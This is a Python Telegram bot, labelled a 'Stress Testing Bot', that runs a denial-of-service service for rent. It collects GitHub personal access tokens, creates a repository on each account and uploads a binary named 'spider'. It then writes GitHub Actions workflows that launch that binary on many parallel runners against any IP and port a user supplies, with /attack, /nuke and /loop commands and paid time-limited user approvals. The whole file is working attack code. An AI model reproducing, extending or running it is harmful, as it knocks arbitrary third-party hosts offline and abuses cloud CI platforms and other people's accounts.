import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENVIRONMENT =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS = int(os.environ.get("RUNNERS", "15"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "150"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set.")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}

# ===== FILE OPERATIONS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INITIALIZATION =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def auto_remove_expired():
    global github_tokens
    if not github_tokens:
        return 0
    removed = 0
    valid = []
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        is_valid, info = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        else:
            removed += 1
            logger.warning(f"Removed invalid token: {token[:10]}... - {info}")
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        logger.info(f"Auto-removed {removed} invalid tokens. Remaining: {len(github_tokens)}")
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK STATE MANAGEMENT =====
def start_attack(attack_id, ip, port, time_val, user_id, token_used=None):
    active_attacks[attack_id] = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None,
        "token": token_used
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD (PROFESSIONAL) =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    auto_remove_expired()
    if not github_tokens:
        await update.message.reply_text("Token vault empty. Add tokens using /addtoken.")
        return ConversationHandler.END
    await update.message.reply_text(
        "Upload binary file named 'spider'.\n"
        "Type /cancel to abort."
    )
    return WAITING_FOR_BINARY

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    if not update.message.document:
        await update.message.reply_text("Please send a file.")
        return WAITING_FOR_BINARY
    file = update.message.document
    if file.file_name != "spider":
        await update.message.reply_text(f"File must be named 'spider'. Found: {file.file_name}")
        return WAITING_FOR_BINARY
    auto_remove_expired()
    if not github_tokens:
        await update.message.reply_text("No valid tokens. Add with /addtoken.")
        return ConversationHandler.END

    progress = await update.message.reply_text("Uploading binary to repositories...")
    file_obj = await file.get_file()
    file_path = f"temp_{file.file_id}.bin"
    await file_obj.download_to_drive(file_path)
    with open(file_path, 'rb') as f:
        content = f.read()
    os.remove(file_path)

    success_count = 0
    fail_count = 0
    results = []
    for token_data in github_tokens:
        token = token_data.get('token')
        repo_name = token_data.get('repo')
        username = token_data.get('username', 'unknown')
        try:
            g = Github(token)
            repo = g.get_repo(repo_name)
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update spider binary", content, existing.sha)
                results.append((username, True, "Updated"))
            except Exception:
                repo.create_file("spider", "Add spider binary", content)
                results.append((username, True, "Created"))
            success_count += 1
        except Exception as e:
            results.append((username, False, f"Error: {str(e)[:40]}"))
            fail_count += 1

    msg = f"Binary deployment complete.\nSuccess: {success_count}, Failed: {fail_count}, Total: {len(github_tokens)}\n"
    for username, success, status in results:
        msg += f"{'✅' if success else '❌'} @{username}: {status}\n"
    await progress.edit_text(msg)
    return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN MANAGEMENT (PROFESSIONAL) =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addtoken <github_token>")
        return
    token = context.args[0].strip()
    is_valid, info = validate_github_token(token)
    if not is_valid:
        await update.message.reply_text(f"Invalid token: {info}")
        return
    for t in github_tokens:
        if t.get('token') == token:
            await update.message.reply_text("Token already exists.")
            return
    g = Github(token)
    user = g.get_user()
    username = user.login
    for t in github_tokens:
        if t.get('username') == username:
            await update.message.reply_text(f"User @{username} already has a token. Remove it first with /removetoken.")
            return
    repo_name = f"spider-{uuid.uuid4().hex[:8]}"
    repo = user.create_repo(repo_name, private=False)
    try:
        repo.create_file(".github/workflows/main.yml", "Init workflow", "")
    except:
        pass
    github_tokens.append({
        'token': token,
        'username': username,
        'repo': f"{username}/{repo_name}",
        'added_at': datetime.now().isoformat()
    })
    save_json('github_tokens.json', github_tokens)
    await update.message.reply_text(f"Token added for @{username}. Repo: {repo_name}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    removed = auto_remove_expired()
    if not github_tokens:
        msg = "Token vault is empty."
        if removed > 0:
            msg = f"Removed {removed} invalid tokens. Vault is now empty."
        await update.message.reply_text(msg)
        return
    msg = "Token Vault:\n\n"
    if removed > 0:
        msg += f"Removed {removed} invalid tokens.\n"
    for i, t in enumerate(github_tokens, 1):
        token_short = t['token'][:10] + "…" + t['token'][-4:]
        msg += f"{i}. @{t.get('username', 'Unknown')} – {token_short}\n"
        msg += f"   Repo: {t['repo']}\n\n"
    msg += f"Total valid: {len(github_tokens)}"
    await update.message.reply_text(msg)

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not github_tokens:
        await update.message.reply_text("No tokens to check.")
        return
    removed = auto_remove_expired()
    msg = f"Token health check:\nTotal: {len(github_tokens)}\nRemoved invalid: {removed}\n\n"
    for i, t in enumerate(github_tokens, 1):
        token_short = t['token'][:10] + "…" + t['token'][-4:]
        msg += f"{i}. @{t.get('username', 'Unknown')} – {token_short} ✅ Valid\n"
    await update.message.reply_text(msg)

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removetoken <token>")
        return
    token = context.args[0]
    found = False
    for i, t in enumerate(github_tokens):
        if t.get('token') == token:
            github_tokens.pop(i)
            save_json('github_tokens.json', github_tokens)
            found = True
            break
    await update.message.reply_text(f"Token {'removed' if found else 'not found'}. Remaining: {len(github_tokens)}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not github_tokens:
        await update.message.reply_text("Vault already empty.")
        return
    count = len(github_tokens)
    if len(context.args) == 1 and context.args[0].lower() == "confirm":
        github_tokens.clear()
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(f"Cleared {count} tokens.")
    else:
        await update.message.reply_text(f"Delete ALL {count} tokens? Use /cleartokens confirm")

# ============================================================
# ===== CORE ATTACK ENGINE (POWER BOOST) =====
# ============================================================

async def launch_attack(update, context, ip, port, time_val, user_id, token_override=None):
    auto_remove_expired()
    if not github_tokens:
        await update.message.reply_text("No GitHub tokens available. Add with /addtoken.")
        return None

    if token_override:
        token_data = next((t for t in github_tokens if t['token'] == token_override), None)
        if not token_data:
            await update.message.reply_text("Token override not found.")
            return None
    else:
        token_data = random.choice(github_tokens)

    token = token_data['token']
    repo_name = token_data['repo']
    username = token_data['username']

    g = Github(token)
    repo = g.get_repo(repo_name)

    try:
        repo.get_contents("spider")
    except:
        await update.message.reply_text("Binary 'spider' missing in repo. Deploy with /binary_upload.")
        return None

    yml_content = f"""name: Attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join(str(i) for i in range(1, RUNNERS+1))}]
    steps:
    - uses: actions/checkout@v4
    - name: System Tuning
      run: |
        sudo sysctl -w net.core.rmem_max=134217728
        sudo sysctl -w net.core.wmem_max=134217728
        sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728"
        sudo sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728"
        sudo sysctl -w net.core.somaxconn=65535
        sudo sysctl -w net.ipv4.udp_mem="10240 87380 134217728"
        ulimit -n 999999
    - name: Execute Attack
      run: |
        chmod +x spider
        sudo nice -n -20 ./spider {ip} {port} {time_val} {THREADS_PER_RUNNER} || sudo nice -n -20 ./spider {ip} {port} {time_val} {THREADS_PER_RUNNER}
"""
    try:
        file = repo.get_contents(YML_FILE_PATH)
        repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
    except:
        try:
            repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
        except:
            repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

    attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
    start_attack(attack_id, ip, port, time_val, user_id, token)
    return attack_id, token_data

# ============================================================
# ===== ATTACK COMMAND =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port_str, time_str = context.args
    try:
        port = int(port_str)
        time_val = int(time_str)
    except:
        await update.message.reply_text("Port and time must be integers.")
        return
    if not (1 <= port <= 65535):
        await update.message.reply_text("Port must be between 1 and 65535.")
        return
    if time_val < 5 or time_val > 3600:
        await update.message.reply_text("Time must be between 5 and 3600 seconds.")
        return

    result = await launch_attack(update, context, ip, port, time_val, user_id)
    if not result:
        return
    attack_id, token_data = result

    async def auto_finish():
        await asyncio.sleep(time_val + 10)
        finish_attack(attack_id)
        logger.info(f"Auto-finished attack {attack_id}")
    timer_task = asyncio.create_task(auto_finish())
    active_attacks[attack_id]["timer_task"] = timer_task

    actions_url = f"https://github.com/{token_data['repo']}/actions"
    msg = (
        f"Attack launched.\n"
        f"Target: {ip}:{port}\n"
        f"Duration: {time_val}s\n"
        f"Runners: {RUNNERS} × {THREADS_PER_RUNNER} threads = {RUNNERS*THREADS_PER_RUNNER} total\n"
        f"Attack ID: {attack_id}\n"
        f"Live logs: {actions_url}\n"
        f"Use /stop to abort."
    )
    await update.message.reply_text(msg)

# ============================================================
# ===== NUKE (MULTI-TARGET) =====
# ============================================================

async def nuke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /nuke <ip:port> [ip:port ...] <time>")
        return

    targets = []
    time_val = None
    for arg in context.args:
        if ":" in arg:
            parts = arg.split(":")
            if len(parts) == 2:
                try:
                    ip = parts[0]
                    port = int(parts[1])
                    if 1 <= port <= 65535:
                        targets.append((ip, port))
                except:
                    pass
        else:
            try:
                time_val = int(arg)
            except:
                pass
    if not targets or not time_val:
        await update.message.reply_text("Invalid format. Use: /nuke ip:port ip:port ... time")
        return
    if time_val < 5 or time_val > 3600:
        await update.message.reply_text("Time must be between 5 and 3600 seconds.")
        return

    if len(github_tokens) < len(targets):
        await update.message.reply_text(f"Need at least {len(targets)} tokens, but only {len(github_tokens)} available.")
        return

    await update.message.reply_text(f"Nuke launched on {len(targets)} targets.")
    tasks = []
    for idx, (ip, port) in enumerate(targets):
        token_override = github_tokens[idx % len(github_tokens)]['token']
        tasks.append(launch_attack(update, context, ip, port, time_val, user_id, token_override))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = 0
    for res in results:
        if isinstance(res, tuple) and res[0]:
            success_count += 1
            attack_id, token_data = res
            async def auto_finish(aid=attack_id):
                await asyncio.sleep(time_val + 10)
                finish_attack(aid)
            timer_task = asyncio.create_task(auto_finish())
            active_attacks[attack_id]["timer_task"] = timer_task

    await update.message.reply_text(f"Nuke completed. Deployed {success_count}/{len(targets)} raids.")

# ============================================================
# ===== LOOP =====
# ============================================================

async def loop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if len(context.args) != 4:
        await update.message.reply_text("Usage: /loop <ip> <port> <duration> <iterations>")
        return

    ip, port_str, dur_str, iter_str = context.args
    try:
        port = int(port_str)
        duration = int(dur_str)
        iterations = int(iter_str)
    except:
        await update.message.reply_text("All arguments must be integers.")
        return
    if not (1 <= port <= 65535) or duration < 5 or duration > 3600 or iterations < 1 or iterations > 20:
        await update.message.reply_text("Invalid values. Port 1-65535, duration 5-3600, iterations 1-20.")
        return

    await update.message.reply_text(f"Looping {iterations} rounds of {duration}s each.")
    for i in range(iterations):
        await update.message.reply_text(f"Round {i+1}/{iterations}...")
        result = await launch_attack(update, context, ip, port, duration, user_id)
        if not result:
            await update.message.reply_text(f"Round {i+1} failed. Stopping.")
            break
        attack_id, token_data = result
        async def auto_finish(aid=attack_id):
            await asyncio.sleep(duration + 5)
            finish_attack(aid)
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task
        await asyncio.sleep(2)
    await update.message.reply_text("Loop complete.")

# ============================================================
# ===== STATUS =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if not active_attacks:
        await update.message.reply_text("No active attacks.")
        return
    total_threads = len(active_attacks) * RUNNERS * THREADS_PER_RUNNER
    msg = f"Active raids: {len(active_attacks)}\nTotal firepower: {total_threads} threads\n\n"
    for aid, data in list(active_attacks.items())[:5]:
        elapsed = int(time.time() - data['start_time'])
        remaining = data['time'] - elapsed
        msg += f"Target: {data['ip']}:{data['port']}\n  Progress: {elapsed}/{data['time']}s (remaining: {remaining}s)\n  ID: {aid[:12]}...\n\n"
    if len(active_attacks) > 5:
        msg += f"... and {len(active_attacks)-5} more."
    await update.message.reply_text(msg)

# ============================================================
# ===== STOP =====
# ============================================================

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if not active_attacks:
        await update.message.reply_text("No active attacks to stop.")
        return
    count = len(active_attacks)
    for aid in list(active_attacks.keys()):
        finish_attack(aid)
    await update.message.reply_text(f"Stopped {count} attack(s).")

# ============================================================
# ===== CHECK ATTACK (DIAGNOSTIC) =====
# ============================================================

async def checkattack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("⛔ Access denied.")
        return
    if not active_attacks:
        await update.message.reply_text("No active attacks to check.")
        return
    msg = "Active attack logs:\n"
    for aid, data in list(active_attacks.items())[:3]:
        repo = data.get('token', {}).get('repo', 'Unknown')
        msg += f"ID: {aid}\n  Repo: {repo}\n  Logs: https://github.com/{repo}/actions\n\n"
    await update.message.reply_text(msg)

# ============================================================
# ===== START, HELP, ABOUT, MYID =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if can_attack(user_id):
        await update.message.reply_text(
            f"Stress Testing Bot v3.0 (Professional)\n"
            f"Architecture: {RUNNERS} runners × {THREADS_PER_RUNNER} threads = {RUNNERS*THREADS_PER_RUNNER} total threads\n\n"
            f"Commands:\n"
            f"/attack <ip> <port> <time> – single target\n"
            f"/nuke <ip:port> ... <time> – multi-target\n"
            f"/loop <ip> <port> <duration> <iterations> – repeat attack\n"
            f"/status – show active attacks\n"
            f"/stop – abort all attacks\n"
            f"/checkattack – diagnostic logs\n"
            f"/help – full command list"
        )
    else:
        # Request approval
        if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
            pending_users.append({"user_id": user_id, "username": update.effective_user.username or "unknown", "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            save_json('pending_users.json', pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        int(owner_id),
                        f"Access request from user {user_id} (@{update.effective_user.username})\nUse /approve {user_id} <days>"
                    )
                except:
                    pass
        await update.message.reply_text("Access denied. Request submitted to admin.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "Full command list:\n\n"
        "Attack commands:\n"
        "/attack <ip> <port> <time> – Launch a single attack.\n"
        "/nuke <ip:port> ... <time> – Attack multiple targets simultaneously.\n"
        "/loop <ip> <port> <duration> <iterations> – Repeat attack N times.\n"
        "/status – Show active attacks with progress.\n"
        "/stop – Terminate all active attacks.\n"
        "/checkattack – Get GitHub Actions log links for active attacks.\n\n"
        "Token management (admin only):\n"
        "/addtoken <token> – Add a GitHub personal access token.\n"
        "/removetoken <token> – Remove a token.\n"
        "/tokens – List all tokens.\n"
        "/checktokens – Validate all tokens.\n"
        "/cleartokens confirm – Remove all tokens.\n\n"
        "User management (admin only):\n"
        "/approve <user_id> <days> – Grant access for N days (0 = lifetime).\n"
        "/remove <user_id> – Revoke access.\n"
        "/users – List approved users.\n"
        "/pending – Show pending access requests.\n"
        "/broadcast <message> – Send announcement to all users.\n"
        "/maintenance on/off – Toggle maintenance mode.\n\n"
        "Binary deployment (admin only):\n"
        "/binary_upload – Upload the 'spider' binary to all repos.\n\n"
        "Utility:\n"
        "/start – Show main dashboard.\n"
        "/myid – Show your Telegram user ID.\n"
        "/about – Bot version and info.\n"
        "/help – This help text."
    )
    await update.message.reply_text(help_text)

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Your Telegram ID: {update.effective_user.id}")

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"Stress Testing Bot v3.0 (Professional)\n"
        f"Architecture: {RUNNERS} parallel runners × {THREADS_PER_RUNNER} threads = {RUNNERS*THREADS_PER_RUNNER} total threads\n"
        f"Built with Python, Pyrogram, GitHub Actions.\n"
        f"For support, contact admin."
    )

# ============================================================
# ===== ADMIN USER COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    target_id = int(context.args[0])
    days = int(context.args[1])
    # Remove from pending
    pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
    save_json('pending_users.json', pending_users)
    approved_users[str(target_id)] = {
        "username": f"user_{target_id}",
        "added_by": user_id,
        "expiry": "LIFETIME" if days == 0 else time.time() + days * 86400,
        "days": days
    }
    save_json('approved_users.json', approved_users)
    await update.message.reply_text(f"User {target_id} approved for {days} days.")
    try:
        await context.bot.send_message(target_id, "You have been granted access. Use /start to begin.")
    except:
        pass

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    target_id = int(context.args[0])
    if str(target_id) in approved_users:
        del approved_users[str(target_id)]
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"User {target_id} removed.")
    else:
        await update.message.reply_text("User not found.")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not approved_users:
        await update.message.reply_text("No approved users.")
        return
    msg = "Approved users:\n"
    for uid, data in approved_users.items():
        msg += f"  {uid} – {data.get('days', '?')} days\n"
    await update.message.reply_text(msg)

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not pending_users:
        await update.message.reply_text("No pending requests.")
        return
    msg = "Pending requests:\n"
    for u in pending_users:
        msg += f"  {u.get('user_id')} (@{u.get('username')}) – {u.get('request_date')}\n"
    await update.message.reply_text(msg)

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    msg = " ".join(context.args)
    sent = 0
    for uid in list(owners.keys()) + list(approved_users.keys()):
        try:
            await context.bot.send_message(int(uid), f"📢 Announcement:\n{msg}")
            sent += 1
        except:
            pass
    await update.message.reply_text(f"Broadcast sent to {sent} users.")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /maintenance on/off")
        return
    mode = context.args[0].lower()
    save_json('maintenance.json', {"maintenance": mode == "on"})
    await update.message.reply_text(f"Maintenance mode {'enabled' if mode == 'on' else 'disabled'}.")

# ============================================================
# ===== CALLBACK HANDLER =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "status":
        await status_cmd(update, context)
    elif data == "stop":
        await stop_cmd(update, context)
    else:
        await query.edit_message_text("Use /help for commands.")

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("An internal error occurred. Check logs.")
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Binary upload conversation
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_start)],
        states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
        fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
    )
    app.add_handler(conv_handler)

    # Commands
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("nuke", nuke_cmd))
    app.add_handler(CommandHandler("loop", loop_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("checkattack", checkattack_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    app.add_handler(CommandHandler("about", about_cmd))

    app.add_handler(CommandHandler("addtoken", addtoken_cmd))
    app.add_handler(CommandHandler("tokens", tokens_cmd))
    app.add_handler(CommandHandler("checktokens", checktokens_cmd))
    app.add_handler(CommandHandler("removetoken", removetoken_cmd))
    app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("remove", removeuser_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("pending", pending_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("maintenance", maintenance_cmd))

    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    logger.info("Professional Stress Testing Bot started.")
    logger.info(f"Runners: {RUNNERS}, Threads per runner: {THREADS_PER_RUNNER}, Total threads: {RUNNERS*THREADS_PER_RUNNER}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
